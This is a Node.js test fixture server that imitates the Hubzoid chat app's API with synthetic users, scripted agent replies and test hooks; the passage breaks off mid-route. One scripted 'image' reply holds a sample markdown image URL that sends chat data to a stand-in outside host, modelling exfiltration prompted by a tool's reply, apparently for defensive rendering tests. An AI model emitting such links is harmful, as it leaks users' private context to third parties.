#!/usr/bin/env node
// In-memory Hubzoid web app API (docs/design/hubzoid-app.md, sections 6.1, 6.2,
// 6.3, 6.5 and 6.6) serving the built chat app from hubzoid/portal_dist. Every
// person, agent and conversation here is synthetic. Nothing talks to a real
// deployment or a model.
//
//   node tests/app-fixture-server.cjs [port]          (default 3410)
//   HZ_FIXTURE_MODE=local node tests/app-fixture-server.cjs   sign-in off
//
// Sign-in mode accounts (password "hubzoid-demo"):
//   ada@example.com (admin), sam@example.com (user), pending@example.com,
//   suspended@example.com. limited@example.com always gets rate_limited.
//
// Scripted replies, chosen by words in the message:
//   tool · fail (failing tool) · think (reasoning) · indicator (reasoning
//   without text) · slow (for Stop) · long (keeps running after reload) ·
//   table / code (markdown) · report (artifact link) · image (an artifact
//   image and an image on another site) · error (run error)
//
// Test hooks:
//   /__fixture/reset                 fresh data
//   /__fixture/state                 recorded requests and store (JSON)
//   /__fixture/flag/<name>/<value>   no_agents, signup, chat_fail, upload_slow,
//                                    one_agent, branded (true | false)
//   /__fixture/mode/<local|accounts> switch sign-in mode
//   /__fixture/expire                end every session (as a revocation would)
"use strict";

const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");
const crypto = require("node:crypto");

const DIST = path.resolve(__dirname, "../../hubzoid/portal_dist");
const PASSWORD = "hubzoid-demo";
const ID = /^[A-Za-z0-9_-]{8,64}$/;
const MAX_UPLOAD = 25 * 1024 * 1024;
const TYPES = {
  ".js": "application/javascript",
  ".css": "text/css",
  ".html": "text/html; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".txt": "text/plain; charset=utf-8",
  ".json": "application/json",
};

// A 1x1 PNG, for image files the agent "wrote".
const TINY_PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");

const now = () => Date.now() / 1000;
const rid = (prefix, n = 16) => prefix + crypto.randomBytes(n).toString("base64url").replace(/[^A-Za-z0-9]/g, "").slice(0, n);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function fail(status, code, message, extra = {}) {
  const e = new Error(message);
  e.status = status;
  e.code = code;
  e.extra = extra;
  return e;
}

// ---- seed data ---------------------------------------------------------------

const AGENTS = [
  {
    id: "hubzoid-guide",
    name: "hubzoid-guide",
    description: "Explains Hubzoid, walks you through building an agent and demonstrates every feature by using it.",
    suggestions: ["What is Hubzoid?", "Show me the three agent types", "What does an AGENTS.md look like?", "Build me an agent for daily standup notes"],
    avatar_url: null,
    hub: "demo-hub",
    api_base: "",
  },
  {
    id: "finance",
    name: "Finance Assistant",
    description: "Answers questions about budgets, invoices and the monthly close using the finance team's hub.",
    suggestions: ["Summarise last month's close", "Which invoices are overdue?", "Draft the budget variance note"],
    avatar_url: null,
    hub: "finance",
    api_base: "/b/finance",
  },
  {
    id: "it-ops",
    name: "IT Ops",
    description: "Checks the status of services, runbooks and on-call rotations.",
    suggestions: ["Who is on call this week?", "Show me the VPN runbook"],
    avatar_url: null,
    hub: "it-ops",
    api_base: "/b/it-ops",
  },
];

function seed() {
  const s = {
    mode: process.env.HZ_FIXTURE_MODE === "local" ? "local" : "accounts",
    flags: { no_agents: false, signup: true, chat_fail: false, upload_slow: false, one_agent: false, branded: false },
    users: [
      { id: "u_ada00001", email: "ada@example.com", name: "Ada Okafor", role: "admin", password: PASSWORD, status: "active" },
      { id: "u_sam00001", email: "sam@example.com", name: "Sam Rivera", role: "user", password: PASSWORD, status: "active" },
      { id: "u_pend0001", email: "pending@example.com", name: "Pat Pending", role: "user", password: PASSWORD, status: "pending" },
      { id: "u_susp0001", email: "suspended@example.com", name: "Sue Spended", role: "user", password: PASSWORD, status: "suspended" },
      { id: "u_local001", email: "admin@localhost", name: "admin@localhost", role: "admin", password: null, status: "active" },
    ],
    sessions: new Map(),
    links: new Map([
      ["set-token-valid-0001", { email: "sam@example.com", purpose: "set_password", used: false }],
      ["reset-token-valid-001", { email: "ada@example.com", purpose: "reset_password", used: false }],
    ]),
    conversations: new Map(),
    messages: new Map(),
    files: new Map(),
    shares: new Map(),
    runs: new Map(),
    connectors: [
      { connector_id: "github", name: "GitHub", allowed: true },
      { connector_id: "notion", name: "Notion", allowed: true },
      { connector_id: "salesforce", name: "Salesforce", allowed: false },
    ],
    tokens: new Map(), // `${user}:${connector}` -> {connected_at, status}
    flows: new Map(),
    requests: [],
  };
  s.tokens.set("u_ada00001:notion", { connected_at: now() - 86400 * 12, status: "active" });
  s.tokens.set("u_local001:notion", { connected_at: now() - 86400 * 12, status: "active" });

  const day = 86400;
  const t0 = now();
  const add = (owner, conv, turns) => {
    s.conversations.set(conv.id, {
      owner_id: owner,
      archived: false,
      title_source: "auto",
      created_at: conv.updated_at - 600,
      head_id: null,
      ...conv,
    });
    let parent = null;
    let at = conv.updated_at - 300;
    for (const [role, content, extra] of turns) {
      const id = rid("m_", 18);
      s.messages.set(id, {
        id,
        conversation_id: conv.id,
        parent_id: parent,
        role,
        content: typeof content === "string" ? [{ type: "text", text: content }] : content,
        status: "complete",
        created_at: (at += 20),
        ...(extra || {}),
      });
      parent = id;
    }
    s.conversations.get(conv.id).head_id = parent;
    return parent;
  };
  for (const owner of ["u_ada00001", "u_local001", "u_sam00001"]) {
    const tag = owner.slice(2, 5);
    add(owner, { id: `c_${tag}pricing01`, title: "Pricing page questions", agent: "hubzoid-guide", hub: "demo-hub", api_base: "", updated_at: t0 - 3600 }, [
      ["user", "What does the pricing page say about the team plan?"],
      [
        "assistant",
        [
          { type: "tool-call", toolCallId: "call_seed_1", toolName: "read_knowledge", args: { path: "knowledge/pricing.md" }, result: { status: "ok" } },
          { type: "text", text: "The **team plan** covers up to 25 people and includes:\n\n- Shared hubs and agents\n- Scheduled workflows\n- Admin Console access\n\nPrices aren't listed publicly; the page asks teams to get in touch." },
        ],
      ],
    ]);
    add(owner, { id: `c_${tag}standup01`, title: "Standup notes agent", agent: "hubzoid-guide", hub: "demo-hub", api_base: "", updated_at: t0 - day - 1800 }, [
      ["user", "Build me an agent for daily standup notes"],
      ["assistant", "Here's a starting point. Create `agents/standup.md` with a short description and a schedule, then add a skill that collects yesterday's commits."],
    ]);
    add(owner, { id: `c_${tag}variance1`, title: "Budget variance for Q3", agent: "finance", hub: "finance", api_base: "/b/finance", updated_at: t0 - day * 3 }, [
      ["user", "Draft the budget variance note for Q3"],
      ["assistant", "Q3 spending came in **4% under budget**. Travel was the largest saving; software subscriptions ran 6% over."],
    ]);
    add(owner, { id: `c_${tag}vpnbook1`, title: "VPN runbook", agent: "it-ops", hub: "it-ops", api_base: "/b/it-ops", updated_at: t0 - day * 21 }, [
      ["user", "Show me the VPN runbook"],
      ["assistant", "1. Check the status page.\n2. Restart the client.\n3. If it still fails, page the on-call engineer."],
    ]);
    add(owner, { id: `c_${tag}archive1`, title: "Old onboarding checklist", agent: "hubzoid-guide", hub: "demo-hub", api_base: "", updated_at: t0 - day * 40, archived: true }, [
      ["user", "Make an onboarding checklist"],
      ["assistant", "Done. The checklist has eight steps."],
    ]);
  }
  return s;
}

// ---- helpers -----------------------------------------------------------------

function send(res, status, body, headers = {}) {
  if (res.writableEnded) return;
  if (status === 204) {
    res.writeHead(204, { "cache-control": "no-store", ...headers });
    return res.end();
  }
  const json = JSON.stringify(body);
  res.writeHead(status, { "content-type": "application/json", "cache-control": "no-store", ...headers });
  res.end(json);
}

function cookies(req) {
  const out = {};
  for (const part of (req.headers.cookie || "").split(";")) {
    const i = part.indexOf("=");
    if (i > 0) out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}

async function readBody(req, limit = MAX_UPLOAD + 1024 * 1024) {
  const chunks = [];
  let size = 0;
  for await (const c of req) {
    size += c.length;
    if (size > limit) throw fail(413, "too_large", "That file is larger than 25 MB, the limit for one file.");
    chunks.push(c);
  }
  return Buffer.concat(chunks);
}

async function readJson(req) {
  const raw = await readBody(req, 5 * 1024 * 1024);
  if (!raw.length) return {};
  try {
    return JSON.parse(raw.toString("utf8"));
  } catch {
    throw fail(400, "bad_request", "The request body isn't valid JSON.");
  }
}

function parseMultipart(buffer, contentType) {
  const m = /boundary=(?:"([^"]+)"|([^;]+))/i.exec(contentType || "");
  if (!m) throw fail(400, "bad_request", "Expected a multipart upload.");
  const boundary = Buffer.from("--" + (m[1] || m[2]));
  let start = buffer.indexOf(boundary);
  while (start !== -1) {
    const next = buffer.indexOf(boundary, start + boundary.length);
    if (next === -1) break;
    const part = buffer.subarray(start + boundary.length + 2, next - 2);
    const headerEnd = part.indexOf("\r\n\r\n");
    const header = part.subarray(0, headerEnd).toString("utf8");
    const body = part.subarray(headerEnd + 4);
    const name = /name="([^"]*)"/i.exec(header)?.[1];
    const filename = /filename="([^"]*)"/i.exec(header)?.[1];
    const type = /content-type:\s*([^\r\n]+)/i.exec(header)?.[1] || "application/octet-stream";
    if (name === "file" && filename !== undefined) return { filename, type, body };
    start = next;
  }
  throw fail(400, "bad_request", "The upload had no file.");
}

// ---- the server ----------------------------------------------------------------

function createApp(options = {}) {
  let state = seed();
  if (options.mode) state.mode = options.mode;
  const dist = options.dist || DIST;

  const publicUser = (u) => ({ id: u.id, email: u.email, name: u.name || u.email, role: u.role });
  const userById = (id) => state.users.find((u) => u.id === id);
  const userByEmail = (email) => state.users.find((u) => u.email.toLowerCase() === String(email || "").toLowerCase());

  function currentUser(req) {
    if (state.mode === "local") return userById("u_local001");
    const token = cookies(req).hz_session;
    const id = token && state.sessions.get(token);
    const user = id && userById(id);
    return user && user.status === "active" ? user : null;
  }
  function requireUser(req) {
    const user = currentUser(req);
    if (!user) throw fail(401, "unauthenticated", "Sign in to continue.");
    return user;
  }
  function startSession(res, user) {
    const token = crypto.randomBytes(24).toString("hex");
    state.sessions.set(token, user.id);
    res.setHeader("set-cookie", `hz_session=${token}; HttpOnly; SameSite=Lax; Path=/`);
  }

  function ownedConversation(user, id) {
    const c = state.conversations.get(id);
    if (!c) throw fail(404, "not_found", "That conversation doesn't exist.");
    if (c.owner_id !== user.id) throw fail(403, "forbidden", "You don't have access to this conversation.");
    return c;
  }
  const convOut = (c) => ({
    id: c.id,
    title: c.title,
    agent: c.agent,
    hub: c.hub,
    api_base: c.api_base,
    archived: !!c.archived,
    created_at: c.created_at,
    updated_at: c.updated_at,
  });
  const msgOut = (m) => ({
    id: m.id,
    parent_id: m.parent_id,
    role: m.role,
    content: m.content,
    status: m.status,
    created_at: m.created_at,
    error: m.error || null,
  });
  const messagesOf = (cid) => [...state.messages.values()].filter((m) => m.conversation_id === cid).sort((a, b) => a.created_at - b.created_at);
  function branchTo(headId) {
    const out = [];
    let cur = headId && state.messages.get(headId);
    while (cur) {
      out.unshift(cur);
      cur = cur.parent_id && state.messages.get(cur.parent_id);
    }
    return out;
  }
  function visibleAgents(user) {
    if (state.flags.no_agents) return [];
    if (state.flags.one_agent) return [AGENTS[0]];
    if (user.role === "admin") return AGENTS;
    return AGENTS.slice(0, 2);
  }

  // ---- scripted runs ---------------------------------------------------------

  function titleFrom(text) {
    const words = text.replace(/[^\w\s'-]/g, " ").split(/\s+/).filter(Boolean).slice(0, 5);
    const title = words.join(" ");
    return title ? title[0].toUpperCase() + title.slice(1) : "New chat";
  }

  function script(text, conv, files) {
    const lower = text.toLowerCase();
    const steps = [];
    const say = (s, delay = 18) => {
      for (let i = 0; i < s.length; i += 7) steps.push({ kind: "text", delta: s.slice(i, i + 7), delay });
    };
    if (files.length) {
      say(`I received ${files.length === 1 ? "your file" : `${files.length} files`}: ${files.map((f) => `**${f.name}**`).join(", ")}. `);
    }
    if (lower.includes("error")) {
      say("Let me look that up. ");
      steps.push({ kind: "error", text: "The model provider is unavailable right now.", delay: 200 });
      return steps;
    }
    if (lower.includes("indicator")) {
      steps.push({ kind: "reasoning-start", delay: 50 });
      steps.push({ kind: "reasoning-indicator", delay: 1200 });
      steps.push({ kind: "reasoning-end", delay: 50 });
      say("I thought it through. The short answer is yes.");
      return steps;
    }
    if (lower.includes("think") || lower.includes("reason")) {
      steps.push({ kind: "reasoning-start", delay: 50 });
      for (const piece of ["The person wants a comparison. ", "I should check the pricing notes first, ", "then compare the two plans on seats and support."])
        steps.push({ kind: "reasoning", delta: piece, delay: 120 });
      steps.push({ kind: "reasoning-end", delay: 50 });
      say("After weighing both plans, the **team plan** fits better: it covers more seats and includes priority support.");
      return steps;
    }
    if (lower.includes("fail")) {
      steps.push({ kind: "tool", id: "call_" + rid("", 8), name: "search_crm", args: { query: "open renewals", limit: 20 }, delay: 100 });
      steps.push({ kind: "tool-error", error: "The CRM didn't respond in time.", delay: 500 });
      say("I couldn't reach the CRM, so I can't list open renewals right now. Try again in a few minutes.");
      return steps;
    }
    if (lower.includes("research")) {
      // A tool from a personal connection, named as the runtimes name MCP tools.
      steps.push({ kind: "tool", id: "call_" + rid("", 8), name: "mcp__my_research__list_knowledge", args: { topic: "pricing" }, delay: 100 });
      steps.push({ kind: "tool-ok", delay: 300 });
      say("Your research notes list three pricing studies from this year.");
      return steps;
    }
    if (lower.includes("tool")) {
      steps.push({ kind: "tool", id: "call_" + rid("", 8), name: "read_knowledge", args: { path: "knowledge/pricing.md" }, delay: 100 });
      steps.push({ kind: "tool-ok", delay: 500 });
      say("I read `knowledge/pricing.md`. The team plan covers up to **25 people** and includes shared hubs, scheduled workflows and the Admin Console.");
      return steps;
    }
    if (lower.includes("slow")) {
      for (let i = 1; i <= 80; i++) steps.push({ kind: "text", delta: `Step ${i} of the long answer. `, delay: 150 });
      return steps;
    }
    if (lower.includes("long")) {
      for (let i = 1; i <= 14; i++) steps.push({ kind: "text", delta: `Part ${i}. `, delay: 300 });
      say("That's everything.");
      return steps;
    }
    if (lower.includes("image")) {
      const prefix = conv.api_base || "";
      // A chart the agent wrote (on this site) and an image on another site
      // whose address carries data from the chat, as a tool's reply can ask for.
      say(
        `Here is the chart I made:\n\n![Quarterly chart](${prefix}/artifacts/${conv.id}/chart.png)\n\n` +
          "The tool suggested this one too:\n\n![Revenue trend](https://images.example.net/collect?data=secret-from-context)\n",
        8,
      );
      return steps;
    }
    if (lower.includes("table") || lower.includes("code")) {
      say(
        "Here are the plans side by side:\n\n| Plan | Seats | Support |\n| --- | ---: | --- |\n| Starter | 5 | Community |\n| Team | 25 | Priority |\n| Enterprise | Unlimited | Dedicated |\n\n" +
          "And a script that reads them:\n\n```python\nimport csv\n\nwith open(\"plans.csv\") as f:\n    for row in csv.DictReader(f):\n        print(row[\"plan\"], row[\"seats\"])  # one line per plan\n```\n\n" +
          "The same in TypeScript:\n\n```ts\nconst plans = await fetch(\"/plans.json\").then((r) => r.json());\nconsole.log(plans.length);\n```\n",
        8,
      );
      return steps;
    }
    if (lower.includes("report") || lower.includes("download")) {
      const prefix = conv.api_base || "";
      // As the real runtimes end a reply: a "Download <file>" footer link.
      say(`I wrote the report.\n\n[Download quarterly-report.csv](${prefix}/artifacts/${conv.id}/quarterly-report.csv)`);
      return steps;
    }
    say(`Here's what I found about “${text.slice(0, 60)}”.\n\n- It's covered in the hub's knowledge.\n- Nothing needs to change today.\n\nAsk me for more detail on any point.`);
    return steps;
  }

  function writeEvent(run, event) {
    if (!run.res || run.res.writableEnded || run.res.destroyed) return;
    run.res.write(`data: ${JSON.stringify(event)}\n\n`);
  }

  async function execute(run) {
    const { message, conv } = run;
    const partsFor = () => message.content;
    let textPart = null;
    let reasoningPart = null;
    let toolPart = null;
    let counter = 0;
    // Keep-alive comments, as the real server sends every 15 s.
    if (run.res && !run.res.writableEnded) run.res.write(": keep-alive\n\n");
    writeEvent(run, { type: "start", messageId: message.id, messageMetadata: { conversationId: conv.id } });
    if (run.firstTitle) writeEvent(run, { type: "data-title", data: { title: run.firstTitle }, transient: true });
    writeEvent(run, { type: "start-step" });
    let lastPing = Date.now();
    const closeText = () => {
      if (textPart) writeEvent(run, { type: "text-end", id: textPart.sid });
      textPart = null;
    };
    try {
      for (const step of run.steps) {
        if (run.cancelled) break;
        await sleep(step.delay || 0);
        if (run.cancelled) break;
        if (Date.now() - lastPing > 2000 && run.res && !run.res.writableEnded) {
          run.res.write(": keep-alive\n\n");
          lastPing = Date.now();
        }
        if (step.kind === "text") {
          if (!textPart) {
            textPart = { type: "text", text: "", sid: `t${++counter}` };
            partsFor().push(textPart);
            writeEvent(run, { type: "text-start", id: textPart.sid });
          }
          textPart.text += step.delta;
          writeEvent(run, { type: "text-delta", id: textPart.sid, delta: step.delta });
        } else if (step.kind === "reasoning-start") {
          closeText();
          reasoningPart = { type: "reasoning", text: "", sid: `r${++counter}` };
          partsFor().push(reasoningPart);
          writeEvent(run, { type: "reasoning-start", id: reasoningPart.sid });
        } else if (step.kind === "reasoning") {
          reasoningPart.text += step.delta;
          writeEvent(run, { type: "reasoning-delta", id: reasoningPart.sid, delta: step.delta });
        } else if (step.kind === "reasoning-indicator") {
          writeEvent(run, { type: "reasoning-delta", id: reasoningPart.sid, delta: "" });
        } else if (step.kind === "reasoning-end") {
          writeEvent(run, { type: "reasoning-end", id: reasoningPart.sid });
          reasoningPart = null;
        } else if (step.kind === "tool") {
          closeText();
          toolPart = { type: "tool-call", toolCallId: step.id, toolName: step.name, args: step.args };
          partsFor().push(toolPart);
          writeEvent(run, { type: "tool-input-available", toolCallId: step.id, toolName: step.name, input: step.args });
        } else if (step.kind === "tool-ok") {
          toolPart.result = { status: "ok" };
          writeEvent(run, { type: "tool-output-available", toolCallId: toolPart.toolCallId, output: { status: "ok" } });
        } else if (step.kind === "tool-error") {
          toolPart.result = { status: "error", message: step.error };
          toolPart.isError = true;
          writeEvent(run, { type: "tool-output-error", toolCallId: toolPart.toolCallId, errorText: step.error });
        } else if (step.kind === "error") {
          closeText();
          message.status = "error";
          message.error = step.text;
          writeEvent(run, { type: "error", errorText: step.text });
        }
        message.updated_at = now();
      }
      closeText();
      if (run.cancelled) message.status = "cancelled";
      else if (message.status === "running") message.status = "complete";
      for (const p of message.content) delete p.sid;
      conv.updated_at = now();
      if (run.title) {
        // The generated title arrives after the first one.
        conv.title = run.title;
        writeEvent(run, { type: "data-title", data: { title: run.title }, transient: true });
      }
      writeEvent(run, { type: "finish-step" });
      writeEvent(run, { type: "finish", messageMetadata: { status: message.status } });
      if (run.res && !run.res.writableEnded) {
        run.res.write("data: [DONE]\n\n");
        run.res.end();
      }
    } finally {
      run.done = true;
    }
  }

  async function chat(req, res, user, hub) {
    const body = await readJson(req);
    const cid = body.conversation_id;
    if (!cid || !ID.test(cid)) throw fail(400, "bad_request", "conversation_id is missing or malformed.");
    let conv = state.conversations.get(cid);
    if (!conv) {
      const agent = AGENTS.find((a) => a.id === body.agent);
      if (!agent) throw fail(400, "agent_required", "Choose an agent for a new conversation.");
      if (agent.hub !== hub) throw fail(409, "wrong_hub", "This agent lives on another hub.");
      conv = { id: cid, owner_id: user.id, title: null, title_source: "pending", agent: agent.id, hub: agent.hub, api_base: agent.api_base, archived: false, created_at: now(), updated_at: now(), head_id: null };
      state.conversations.set(cid, conv);
    }
    if (conv.owner_id !== user.id) throw fail(403, "forbidden", "You don't have access to this conversation.");
    if (conv.hub !== hub) throw fail(409, "wrong_hub", "This conversation lives on another hub.");
    if (state.flags.chat_fail) throw fail(503, "unavailable", "The agent is unavailable right now. Try again in a minute.");
    if ([...state.runs.values()].some((r) => r.conv.id === cid && !r.done))
      throw fail(409, "run_in_progress", "A reply is already being written in this conversation.");
    const replyId = body.assistant_message_id || rid("m_", 18);
    if (!ID.test(replyId)) throw fail(400, "bad_id", "assistant_message_id is malformed.");
    let userMessage;
    if (body.message) {
      const m = body.message;
      if (!ID.test(m.id || "")) throw fail(400, "bad_id", "The message id is malformed.");
      const existing = state.messages.get(m.id);
      if (existing && existing.conversation_id !== cid) throw fail(409, "id_conflict", "That message id belongs to another conversation.");
      if (body.parent_id) {
        const parent = state.messages.get(body.parent_id);
        if (!parent || parent.conversation_id !== cid) throw fail(400, "bad_parent", "parent_id doesn't exist.");
        if (parent.role !== "assistant") throw fail(400, "bad_parent", "A new message must follow an assistant message.");
      }
      const files = (m.content || []).filter((p) => p.type === "file");
      if (files.length > 10) throw fail(400, "too_many_files", "You can attach up to 10 files to one message.");
      for (const f of files) if (!state.files.has(f.file_id)) throw fail(400, "unknown_file", `The file ${f.name} wasn't uploaded to this conversation.`);
      userMessage =
        existing ||
        {
          id: m.id,
          conversation_id: cid,
          parent_id: body.parent_id || null,
          role: "user",
          content: (m.content || []).map((p) => (p.type === "file" ? { ...p, type: String(p.mime || "").startsWith("image/") ? "image" : "file" } : p)),
          status: "complete",
          created_at: now(),
        };
      state.messages.set(m.id, userMessage);
    } else {
      userMessage = state.messages.get(body.parent_id);
      if (!userMessage || userMessage.role !== "user") throw fail(400, "bad_parent", "Regenerate needs a user message as parent_id.");
    }
    if (state.messages.has(replyId)) {
      const other = state.messages.get(replyId);
      if (other.conversation_id !== cid) throw fail(409, "id_conflict", "That message id belongs to another conversation.");
    }
    const reply = { id: replyId, conversation_id: cid, parent_id: userMessage.id, role: "assistant", content: [], status: "running", created_at: now() + 0.001, model: conv.agent };
    state.messages.set(replyId, reply);
    conv.head_id = replyId;
    conv.updated_at = now();
    const text = userMessage.content.filter((p) => p.type === "text").map((p) => p.text).join("\n");
    const files = userMessage.content.filter((p) => p.type === "file" || p.type === "image");
    let title = null;
    let firstTitle = null;
    if (!conv.title) {
      // Named from the first message at once; the generated title follows.
      firstTitle = text.replace(/\s+/g, " ").trim().slice(0, 40) || "New chat";
      conv.title = firstTitle;
      title = titleFrom(text);
    }
    res.writeHead(200, {
      "content-type": "text/event-stream",
      "cache-control": "no-cache",
      connection: "keep-alive",
      "x-vercel-ai-ui-message-stream": "v1",
    });
    const run = { message: reply, conv, res, cancelled: false, done: false, steps: script(text, conv, files), title, firstTitle };
    state.runs.set(replyId, run);
    req.on("close", () => {
      run.res = null; // the run keeps going, like the real server task
    });
    await execute(run);
  }

  // ---- routing -----------------------------------------------------------------

  async function api(req, res, url) {
    let pathname = url.pathname;
    let hub = "demo-hub";
    const scoped = /^\/b\/([^/]+)(\/.*)$/.exec(pathname);
    if (scoped) {
      hub = scoped[1];
      pathname = scoped[2];
    }
    const method = req.method;
    const record = { method, path: url.pathname + url.search, at: Date.now() };
    state.requests.push(record);
    if (state.requests.length > 2000) state.requests.splice(0, 500);

    // Cookie-authenticated mutations must come from this origin (contract 6).
    if (!["GET", "HEAD"].includes(method)) {
      const origin = req.headers.origin || (req.headers.referer ? new URL(req.headers.referer).origin : null);
      if (origin && origin !== `http://${req.headers.host}`) throw fail(403, "bad_origin", "Cross-site request refused.");
    }

    // Hub-scoped calls go to the hub's bridge; deployment-wide calls don't.
    const hubScoped =
      pathname === "/api/chat" ||
      /^\/api\/runs\//.test(pathname) ||
      (pathname === "/api/conversations" && method === "POST") ||
      (/^\/api\/conversations\/[^/]+$/.test(pathname) && method === "DELETE") ||
      /^\/api\/conversations\/[^/]+\/files/.test(pathname) ||
      /^\/artifacts\//.test(pathname);
    if (scoped && !hubScoped) throw fail(404, "not_found", "Deployment-wide calls take no /b/<hub> prefix.");

    // ---- 6.1 sign-in ----
    if (pathname === "/api/auth/session" && method === "GET") {
      const user = currentUser(req);
      return send(res, 200, {
        authenticated: !!user,
        mode: state.mode,
        ...(user ? { user: publicUser(user) } : {}),
        providers: state.mode === "local" ? [] : [{ id: "google", name: "Google" }],
        password: state.mode !== "local",
        signup: state.mode !== "local" && state.flags.signup,
        branding_name: "Hubzoid",
      });
    }
    if (pathname === "/api/auth/login" && method === "POST") {
      const body = await readJson(req);
      if (String(body.email).toLowerCase() === "limited@example.com")
        throw fail(429, "rate_limited", "Too many sign-in attempts. Try again in 15 minutes.", { retry_after: 900 });
      const user = userByEmail(body.email);
      if (!user || !user.password || user.password !== body.password) throw fail(401, "invalid_credentials", "That email and password don't match.");
      if (user.status === "pending") throw fail(403, "pending", "Your account is waiting for approval.");
      if (user.status === "suspended") throw fail(403, "suspended", "This account is suspended.");
      startSession(res, user);
      return send(res, 200, { user: publicUser(user) });
    }
    if (pathname === "/api/auth/logout" && method === "POST") {
      const token = cookies(req).hz_session;
      if (token) state.sessions.delete(token);
      return send(res, 204, null, { "set-cookie": "hz_session=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax" });
    }
    if (pathname === "/api/auth/signup" && method === "POST") {
      if (!state.flags.signup || state.mode === "local") throw fail(403, "signup_disabled", "Self sign-up is off.");
      const body = await readJson(req);
      if (!body.email || !/@/.test(body.email)) throw fail(400, "invalid_email", "Enter a valid email.");
      if (!body.password || body.password.length < 8) throw fail(400, "password_too_short", "Use at least 8 characters.");
      if (userByEmail(body.email)) throw fail(409, "email_taken", "An account with this email already exists.");
      const active = body.email.toLowerCase().endsWith("@example.com");
      state.users.push({ id: rid("u_", 10), email: body.email, name: body.name || body.email, role: "user", password: body.password, status: active ? "active" : "pending" });
      return send(res, 201, { status: active ? "active" : "pending" });
    }
    let m;
    if ((m = /^\/api\/auth\/link\/([^/]+)$/.exec(pathname))) {
      const link = state.links.get(decodeURIComponent(m[1]));
      if (method === "GET") {
        if (!link || link.used) return send(res, 200, { valid: false });
        return send(res, 200, { valid: true, purpose: link.purpose, email: link.email });
      }
      if (method === "POST") {
        if (!link || link.used) throw fail(410, "link_invalid", "This link has expired or was already used.");
        const body = await readJson(req);
        if (!body.password || body.password.length < 8) throw fail(400, "password_too_short", "Use at least 8 characters.");
        const user = userByEmail(link.email);
        user.password = body.password;
        link.used = true;
        startSession(res, user);
        return send(res, 200, { user: publicUser(user) });
      }
    }
    if (pathname === "/api/auth/password" && method === "POST") {
      const user = requireUser(req);
      const body = await readJson(req);
      if (user.password !== body.current_password) throw fail(401, "invalid_credentials", "Your current password isn't right.");
      if (!body.new_password || body.new_password.length < 8) throw fail(400, "password_too_short", "Use at least 8 characters.");
      user.password = body.new_password;
      const mine = cookies(req).hz_session;
      for (const [token, id] of state.sessions) if (id === user.id && token !== mine) state.sessions.delete(token);
      return send(res, 204);
    }
    if (pathname === "/api/auth/me" && method === "PATCH") {
      const user = requireUser(req);
      const body = await readJson(req);
      if (typeof body.name === "string" && body.name.trim()) user.name = body.name.trim();
      return send(res, 200, { user: publicUser(user) });
    }

    // ---- 6.5 agents and branding ----
    if (pathname === "/api/agents" && method === "GET") {
      const user = requireUser(req);
      const agents = visibleAgents(user);
      return send(res, 200, { agents, default_agent: agents[0]?.id ?? null });
    }
    if (pathname === "/api/branding" && method === "GET")
      return send(
        res,
        200,
        state.flags.branded
          ? { name: "Acme Support", logo_url: "/branding/logo.svg", favicon_url: "/branding/favicon.svg", custom_css_url: "/branding/custom.css" }
          : { name: "Hubzoid", logo_url: null, favicon_url: null, custom_css_url: null },
      );

    // ---- 6.6 personal connections ----
    if (pathname === "/api/connections" && method === "GET") {
      const user = requireUser(req);
      return send(
        res,
        200,
        state.connectors.map((c) => {
          const tok = state.tokens.get(`${user.id}:${c.connector_id}`);
          return { connector_id: c.connector_id, name: c.name, connected: !!tok, status: tok ? tok.status : "not_connected", connected_at: tok ? tok.connected_at : null, allowed: c.allowed };
        }),
      );
    }
    if ((m = /^\/api\/connections\/([^/]+)\/connect$/.exec(pathname)) && method === "POST") {
      const user = requireUser(req);
      const connector = state.connectors.find((c) => c.connector_id === m[1]);
      if (!connector) throw fail(404, "not_found", "No such connection.");
      if (!connector.allowed) throw fail(403, "forbidden", "You can't use this connection.");
      const flow = rid("f", 12);
      state.flows.set(flow, { user: user.id, connector: connector.connector_id });
      return send(res, 200, { authorize_url: `/__fixture/provider/${connector.connector_id}?state=${flow}` });
    }
    if ((m = /^\/api\/connections\/([^/]+)$/.exec(pathname)) && method === "DELETE") {
      const user = requireUser(req);
      state.tokens.delete(`${user.id}:${m[1]}`);
      return send(res, 204);
    }

    // ---- 6.2 conversations ----
    if (pathname === "/api/conversations" && method === "GET") {
      const user = requireUser(req);
      const q = (url.searchParams.get("q") || "").toLowerCase();
      const archived = url.searchParams.get("archived") === "1";
      const limit = Math.max(1, Math.min(100, Number(url.searchParams.get("limit")) || 50));
      const cursor = Number(url.searchParams.get("cursor")) || 0;
      let items = [...state.conversations.values()]
        .filter((c) => c.owner_id === user.id && !!c.archived === archived)
        .filter((c) => {
          if (!q) return true;
          if ((c.title || "").toLowerCase().includes(q)) return true;
          return messagesOf(c.id).some((msg) => JSON.stringify(msg.content).toLowerCase().includes(q));
        })
        .filter((c) => messagesOf(c.id).length > 0 || c.title)
        .sort((a, b) => b.updated_at - a.updated_at);
      const page = items.slice(cursor, cursor + limit);
      return send(res, 200, { items: page.map(convOut), next_cursor: cursor + limit < items.length ? String(cursor + limit) : null });
    }
    if (pathname === "/api/conversations" && method === "POST") {
      const user = requireUser(req);
      const body = await readJson(req);
      const agent = AGENTS.find((a) => a.id === body.agent);
      if (!agent) throw fail(400, "unknown_agent", "That agent doesn't exist.");
      if (agent.hub !== hub) throw fail(409, "wrong_hub", "This agent lives on another hub.");
      const id = body.id && ID.test(body.id) ? body.id : rid("c_", 18);
      const existing = state.conversations.get(id);
      if (existing) {
        if (existing.owner_id !== user.id) throw fail(409, "conflict", "That conversation id is taken.");
        return send(res, 200, { conversation: convOut(existing) });
      }
      const conv = { id, owner_id: user.id, title: null, title_source: "pending", agent: agent.id, hub: agent.hub, api_base: agent.api_base, archived: false, created_at: now(), updated_at: now(), head_id: null };
      state.conversations.set(id, conv);
      return send(res, 201, { conversation: convOut(conv) });
    }
    if ((m = /^\/api\/conversations\/([^/]+)$/.exec(pathname))) {
      const user = requireUser(req);
      const conv = ownedConversation(user, decodeURIComponent(m[1]));
      if (method === "GET")
